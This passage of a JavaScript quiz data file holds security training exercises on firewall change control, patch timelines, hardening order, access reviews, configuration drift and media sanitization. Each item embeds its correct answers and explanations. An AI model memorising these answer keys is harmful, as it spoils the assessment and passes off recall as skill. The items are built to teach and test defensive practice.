host"],["Server build written as code in the pipeline","Hosts created with the same settings every time"],["Nightly hash check of system files","A changed file on a monitored host is reported"],["STIG for a hardened server","Strict settings written for government systems"]],"why":"These artefacts work together. The benchmark or the government guide says what good looks like, the golden image carries those settings onto new hosts, and the pipeline rebuilds the same host from code. Group Policy keeps the settings in place after the build, and the nightly hash check reports the moment a monitored file changes, which is how drift is found. The pipeline entry is infrastructure as code, the benchmark or the government guide is the secure baseline, and the nightly hash check is file integrity monitoring.","hint":"One artefact describes good settings, one carries them, one rebuilds them, one keeps them, one reports changes.","kw":["Group Policy","CIS Benchmark","STIG","golden image","infrastructure as code (IaC)","file integrity monitoring (FIM)","configuration drift"]},{"id":"M24","type":"branch","theme":"Configuration enforcement","points":12,"scenario":"At 14:20 a monitoring alert shows that the production firewall now permits TCP 8080 from any address to the management interface of the payment switch. An engineer made the change by hand, and the change calendar shows no approved record for it.","question":"Handle the unapproved change, one decision at a time.","steps":[{"sit":"The rule is live and the management interface is reachable. What is your first action?","opts":["Compare the running rule set with the approved baseline and capture what changed","Reboot the firewall so it loads the older configuration by itself","Close the alert because an internal engineer made the change on purpose","Ask the engineer to explain the change in the incident channel"],"correct":0,"res":["You now hold the exact rule and the before and after state, which is the evidence a change review needs.","A reboot on a production firewall risks an outage and destroys the current configuration you still need.","An unapproved change on an internet facing device is an incident until it is explained and recorded.","You may learn the reason, but the rule is still live and nothing is documented."]},{"sit":"The rule is not needed by any application, and the management interface is exposed to the internet.","opts":["Restore the last approved rule set and keep both configuration exports","Edit the rule by hand so it allows only the office address","Leave the rule in place and add monitoring for the management port","Add a second firewall in front of the switch and keep the rule"],"correct":0,"res":["Restoring the approved rule set returns the device to the baseline, and the two exports prove the difference.","A hand edit repairs the symptom and leaves the device outside the approved baseline.","The exposure stays open while you watch it, which does not reduce the risk.","Adding a device in front of an unapproved rule leaves the rule in place."]},{"sit":"The device is back on the approved rule set. The review asks what will prevent this from happening again.","opts":["Require a change record with review, and remove direct administrator access to the firewall","Ask the engineer to be more careful and send the team a reminder","Take a night backup of the firewall configuration","Add the management port to the weekly vulnerability scan"],"correct":0,"res":["Change management puts a second pair of eyes on every change, and the jump box removes the standing access that allowed a silent change.","A reminder does not stop a rushed or careless change, and it leaves the same access in place.","Backups help you recover, and they prevent nothing.","A scan reports the exposure after it is open, and does not stop the next change."]}],"why":"An unapproved change on a firewall is treated as an incident until it is explained, recorded and reversed. Capturing the difference against the baseline gives you evidence, restoring the approved configuration removes the exposure, and change management with a jump box stops the next silent change. Rebooting the device or editing by hand both make the situation worse. Restoring the approved rule set is the rollback plan, and taking the firewall administrator rights away from engineers is least privilege.","hint":"Capture the difference, return to the approved state, then fix the process that allowed the change.","kw":["change management","secure baseline","rollback plan","configuration drift","jump box / bastion host","least privilege"]},{"id":"M25","type":"dual","theme":"Patching and vulnerability management","points":12,"scenario":"A widely used file transfer product is on the estate. The vendor published a fix two days ago, and your scan data is one week old. You look at the same problem from both sides.","question":"Answer both parts: one as the defender, one as the attacker.","q1":{"q":"Blue team: which signal tells you that an internal host is still missing the critical fix, without logging on to the host?","opts":["A ping sweep of the subnet that lists the hosts that answer","An authenticated scan that reads the installed build number","An agent report that shows the last reboot time of the host","A port scan that lists the services the host has open"],"correct":[1]},"q2":{"q":"Red team: the fix is public. Which action is most likely to give you a working exploit?","opts":["Compare the fixed build with the old build to find the flaw, then scan for hosts on the old build","Send a message that asks users to update the product themselves","Scan for the product version and try a short list of default passwords","Wait for a public exploit to appear and leave the finding open"],"correct":[0]},"why":"An authenticated scan reads the build number from inside the host, so it can tell a fixed host from an unfixed one, while a port scan only shows that the service is listening. Attackers do the same work from the other side: a published fix shows exactly which code changed, so the fast path is to compare the two builds and hunt for hosts that still run the old one. Reading the installed build from inside the host is what makes the scan an authenticated vulnerability scan, and a reachable flaw at this CVSS level justifies an emergency out-of-band patch rather than a wait for the window.","hint":"One side must read the installed version; the other side reads the fix itself to learn what it repaired.","kw":["patch management","authenticated vulnerability scan","CVSS","emergency out-of-band patch","patch prioritization"]},{"id":"M26","type":"order","theme":"Hardening techniques","points":12,"scenario":"The server team is rebuilding the build runbook after an audit found that hardening steps were done in different orders by different engineers. You must write the order for a new Windows application server.","question":"Put the build steps in the order they must happen.","items":["Install the minimal operating system from the approved image","Apply the current patches and restart","Turn off the services and ports the server role does not need","Apply the secure baseline settings for this server type","Install the endpoint agent and apply the host firewall policy","Run an authenticated scan to prove the baseline was applied","Record the build and hand the server over to operations"],"why":"The build starts from the approved image so the base is known, and patching comes next so later settings are not applied to a host with known holes. Unused services and ports are removed while the host is still offline to users, the baseline and the agent follow, and then a scan proves the settings really landed. The record is written last, because it must describe what was actually built. Patching comes before the baseline, and the endpoint agent installed at step five is the EDR that watches the finished host. Patching before the baseline is the patch management decision in this runbook, and it is deliberate: later settings must not be applied to a host with known holes.","hint":"Build, fix, remove, configure, protect, prove, document.","kw":["golden image","patch management","disabling unused ports and protocols","secure baseline","host-based firewall","endpoint detection and response (EDR)","authenticated vulnerability scan"]},{"id":"M27","type":"spot","theme":"Access control and least privilege","points":12,"scenario":"The quarterly access review export for the server administration tool is open. You must flag the accounts that have to be revoked now, and leave healthy accounts alone. Each line shows one account, its role, its last activity and its status.","question":"Click the three accounts that must be revoked in this review.","art":{"title":"access review export - server admin tool - quarter 2","kind":"log","pick":true,"lines":["a.nguyen    | finance     | role payroll-clerk    | last sign-in 2 days ago    | status active","m.torres    | it          | role helpdesk         | last sign-in 1 day ago     | status active","svc_legacy  | it          | role backup-operator  | last sign-in 141 days ago  | status active","p.singh     | sales       | role sales-rep        | last sign-in 3 hours ago   | status active","j.okafor    | hr          | role hr-generalist    | last sign-in 5 days ago    | status active","k.meyer     | engineering | role build-operator   | contract ended 30 days ago | status active","r.dubois    | it          | role network-admin    | last sign-in 1 day ago     | status active","reception   | front desk  | shared sign-in by 6 people | last sign-in today    | status active"]},"bad":[2,5,7],"whyEach":["A named user with a live business role and recent activity, so it stays.","A named user in the right role with activity yesterday, so it stays.","This is the finding: an old service account that has not been used for 141 days still holds a privileged role. A dormant privileged account is an orphaned account, and it is the first thing an attacker looks for.","A named user with a live role and very recent activity, so it stays.","A named user with a live role and recent activity, so it stays.","This is the finding: the contractor contract ended 30 days ago and the account is still active. Offboarding failed, so the account must be revoked now.","A named administrator with activity yesterday, so it stays.","This is the finding: one shared account is used by six people, so no action can be traced to a person. Shared accounts break accountability and must be replaced by named accounts."],"why":"An access review asks one question for every account: is this exact access still needed by this exact identity? A dormant service account with a privileged role, an account whose contract ended, and a shared account used by six people all fail that question. Named users with live roles and recent activity pass it, so revoking them would break work. The shared helpdesk account is the one that breaks accountability, and protecting separation of duties is the reason the review exists.","hint":"Look for privilege without a current owner, an identity whose reason to exist has ended, and one identity shared by many people.","kw":["access review","orphaned account","service account","least privilege","separation of duties"]},{"id":"M28","type":"fill","theme":"Lifecycle, sanitization and governance","points":10,"scenario":"The asset disposal procedure must say exactly how each kind of media is cleaned before it moves on. The auditor checks that the method matches the media type and the next owner.","question":"Choose the method that completes each gap in the disposal procedure.","parts":["A support laptop that will be rebuilt and reused inside the company has its disk ",{"b":0}," first. A failed magnetic tape that held payroll data is ",{"b":1}," before it leaves the building. An encrypted solid state drive is cleaned fastest and most safely by ",{"b":2},". A disk that must leave the site with no readable data at all goes for ",{"b":3},"."],"answers":["overwritten with a verified pattern","degaussed","cryptographic erase","physical destruction"],"extras":["deleted in the file manager","reformatted once","moved to the recycle bin"],"why":"Deleting files or formatting a volume only removes the index, and the data stays on the medium, so neither is sanitization. Overwriting with a verified pattern is enough for media that stays inside the company, degaussing destroys the magnetic field on tape, and cryptographic erase throws away the key so the encrypted blocks become useless. Physical destruction is the final answer when the medium must not leave with any readable data. Overwrite wipe is the clear step for media that stays in the company, and all four methods belong in a decommissioning record.","hint":"Ask whether the medium stays inside the company, and whether the data is encrypted or magnetic.","kw":["data sanitization","overwrite wipe","degaussing","cryptographic erase","physical destruction","decommissioning"]},{"id":"M29","type":"spot","theme":"Configuration enforcement","points":12,"scenario":"The weekly baseline comparison report for the domain controllers has arrived. Two settings no longer match the approved baseline, and you must point at the two lines that show the drift.","question":"Click the two lines that show a setting which has drifted from the baseline.","art":{"title":"baseline comparison - domain controllers - week 14","kind":"code","pick":true,"lines":["Interactive logon: Do not display last signed in user | baseline Enabled | live Enabled","Interactive logon: Message text for users attempting to log on | baseline set | live MISSING","Minimum password length | baseline 14 | live 14","Account lockout threshold | baseline 5 | live 5","Microsoft network server: Digitally sign communications (always) | baseline Enabled | live Disabled","Windows Defender real time protection | baseline Enabled | live Enabled"]},"bad":[1,4],"whyEach":["Baseline and live agree, so this setting has not moved.","This is drift. The logon warning banner that the baseline requires is not present on the live host, so a legal and policy control has been removed.","The password length matches the baseline.","The lockout threshold matches the baseline.","This is drift, and it matters more than the banner. With digital signing turned off, the file sharing traffic can be relayed or altered by an attacker on the same network.","Real time protection is still on, so this setting has not moved."],"why":"Configuration drift is any setting that no longer matches the approved baseline. The banner is a policy and legal control, and the missing SMB signing is a technical control that protects file share traffic from relay and tampering. A comparison report is only useful if you can name the setting, the expected value and the live value. The expected values come from the CIS Benchmark, which is what makes drift measurable instead of a matter of opinion.","hint":"Compare each line with itself: where do the baseline value and the live value disagree?","kw":["configuration drift","secure baseline","Group Policy","SMB signing","CIS Benchmark"]},{"id":"M30","type":"match","theme":"Hardening techniques","points":10,"scenario":"The workstation hardening standard is being explained to the service desk. Each action has to be paired with the threat it reduces, so the desk understands why users will notice a change.","question":"Match each hardening action with the threat it reduces.","pairs":[["Disable LLMNR and NetBIOS name resolution","Credential theft through poisoned name resolution"],["Block macros in files that arrive from the internet","A phishing document that starts a payload"],["Remove local administrator rights from ordinary users","Ransomware that needs administrator rights to encrypt everything"],["Turn off autorun for removable drives","Malware that arrives on a plugged in USB stick"],["Remove the unused web administration page from the appliance","Exploit of an old management interface"]],"why":"Attack surface reduction removes features that the business does not use, so there is less to attack. Poisoned name resolution lets an attacker on the same network capture credentials, macros turn a document into a program, and local administrator rights let malware change the whole host. Autorun removes a way in for removable media, and an unused page is code that nobody needs and nobody watches. Blocking macros is macro blocking, taking rights away is least privilege, and deleting a page or a protocol is removing unnecessary software and disabling unused ports and protocols.","hint":"For each action, ask which attacker step becomes impossible once the feature is gone.","kw":["attack surface reduction","macro blocking","disable LLMNR / NetBIOS","least privilege","disabling unused ports and protocols","removing unnecessary software"]},{"id":"M31","type":"mcq","multi":false,"theme":"Access control and least privilege","points":10,"scenario":"Eight months ago all 400 workstation users were given local administrator rights so that they could install their own tools. The team now finds unlicensed and unmanaged programs on the fleet, and the endpoint agent flagged two of them last month. Management wants the largest reduction in attack surface that the service desk can support.","question":"Which change reduces the attack surface most at this point?","opts":["Turn on full disk encryption for every workstation in the company fleet","Remove local administrator rights and publish an allow list of tools","Block every USB storage device across the whole workstation fleet","Run a monthly phishing simulation for every member of the staff"],"correct":[1],"whyEach":["Full disk encryption protects data if a laptop is lost, and it does nothing about unmanaged software that users install themselves.","Correct. Taking away the rights stops silent installs, and the allow list defines what may run, which is the direct answer to unmanaged programs.","Blocking USB storage closes one path for data loss, and it leaves the main problem of unmanaged software alone.","Awareness reduces the chance that someone clicks, and it does not stop a user from installing a program they want."],"why":"The exposure comes from ordinary users holding administrator rights, because that is what lets them install anything. Removing those rights and publishing an allow list of the tools people really need removes the exposure and gives the service desk a clear process. The other options are useful controls, but none of them touches the cause here. Taking the rights away is least privilege, and it shrinks the attack surface faster than any tool that only watches.","hint":"Ask what allowed the unmanaged programs to appear in the first place.","kw":["least privilege","application allow list","attack surface reduction","full-disk encryption"]},{"id":"M32","type":"calc","theme":"Patching and vulnerability management","points":8,"scenario":"A critical remote code execution fix for the database server was published on 3 March. The next maintenance window was 8 March, but the install failed and the server was only fixed on 22 March. Your service level agreement allows 14 days from publication for critical fixes, and the finding is being written up.","question":"How many days after publication did the server finally run the fix? Enter the number of days.","answerNum":19,"tol":0,"unit":"days","why":"The clock runs from publication, not from the maintenance window, so 3 March to 22 March is 19 days. The service level target was 14 days, so the install missed it by five days, and the failed window on 8 March does not pause the clock. A fix for a reachable remote code execution flaw would also justify an emergency out of band install rather than waiting for the next window. The miss itself is a patch management failure, and the CVSS level is what makes the delay hard to defend.","hint":"Count from the publication date to the date the fix actually ran, not to the first attempt.","kw":["patch management","maintenance window","emergency out-of-band patch","patch prioritization","CVSS"]}];

      S.disp[ex.id] = ex.type === "order" ? derange(n) : shuffle(range(n));

  function branchOrder(ex, i) {

  function dualOrder(ex, key, g) {
